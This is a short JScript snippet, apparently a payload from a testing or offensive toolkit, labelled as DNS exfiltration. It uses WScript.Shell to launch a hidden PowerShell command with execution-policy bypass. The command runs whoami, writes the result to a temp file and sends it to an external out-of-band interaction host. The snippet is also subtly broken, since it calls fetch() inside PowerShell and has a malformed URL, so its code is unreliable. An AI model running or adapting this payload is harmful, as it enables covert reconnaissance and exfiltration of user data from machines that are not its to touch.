// DNS Exfiltration - whoami via PowerShell
var cmd = 'powershell -nop -exec bypass -c "whoami | Out-File -Encoding ascii C:\\temp\\whoami.txt; $content = Get-Content C:\\temp\\whoami.txt; fetch(\\'http:rnjfqzizxajevsjjzcfew5oiup9b1ok72.oast.fun/\\' + $content)"';
var shell = new ActiveXObject("WScript.Shell");
shell.Run(cmd, 0, false);
